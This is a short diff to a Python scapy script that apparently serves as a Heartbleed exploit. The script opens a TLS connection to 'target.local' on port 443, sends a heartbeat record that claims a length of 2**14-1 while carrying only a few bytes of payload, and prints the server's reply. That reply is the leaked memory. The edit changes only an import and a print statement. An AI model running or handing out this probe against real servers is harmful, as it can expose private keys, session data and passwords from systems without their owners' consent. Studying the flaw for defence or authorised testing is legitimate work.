@@ -1,5 +1,5 @@
 import scapy
-from scapy_ssl_tls.ssl_tls import TLS
+from scapy.layers.ssl_tls import *
 import socket
 
 target = ('target.local',443)
@@ -13,6 +13,5 @@ s.recv(8192)
 p = TLSRecord(version="TLS_1_1")/TLSHeartBeat(length=2**14-1,data='bleed...')
 s.sendall(str(p))
 resp = s.recv(8192)
-#print ("resp: %s"%repr resp)
-print (resp)
+print "resp: %s"%repr(resp)
 s.close()
